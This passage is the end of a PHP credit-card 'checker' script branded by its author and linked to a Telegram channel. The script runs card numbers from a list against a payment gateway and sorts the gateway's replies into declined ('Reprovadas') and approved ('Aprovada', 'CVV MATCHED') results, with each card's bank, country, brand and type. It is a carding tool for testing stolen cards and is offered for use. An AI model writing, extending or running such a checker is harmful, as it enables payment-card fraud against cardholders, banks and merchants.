     echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Card Doesnt Support Purchase ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ 3D Secure Redirect ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result,"missing_payment_information")){
     echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Missing Payment Informations ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "Payment cannot be processed, missing credit card number")) {
     echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="badge badge-info">  『 ★ Missing Credit Card Number ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
elseif (strpos($result, "Your payment has already been processed")) {
  echo '<span class="badge badge-success">Aprovada ✅</span></br> <span class="badge badge-success">♛</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">♛</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』 </span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
else {
    echo '<span class="new badge badge-red">#Reprovadas❌ </span></br> <span class="new badge badge-red">' . $lista . '</span> <span class="new badge badge-warning">  『 ★ Error Not Listed ★ 』</span> </b><br><span class="new badge red"> Bank: </span> '.$bank.' |<span class="new badge red"> Currency: </span>  '.$currency. '  | <span class="new badge red"> Country: </span> '.$name.' '.$emoji.'  | <span class="new badge red"> Brand: </span>  '.$brand.' | <span class="new badge red"> Scheme: </span>  '.$scheme.' | <span class="new badge red"> Type: </span> '.$type.' |  </br><span class="new badge badge-warning">★ 👑 CAGE 👑 ★ ♛</span></br></br>';
}
curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
//echo $result 
////////////////////// 1req Checker Made By ★ 👑 CAGE 👑 ★ ♛
////////////////////// Join @xn_network
?>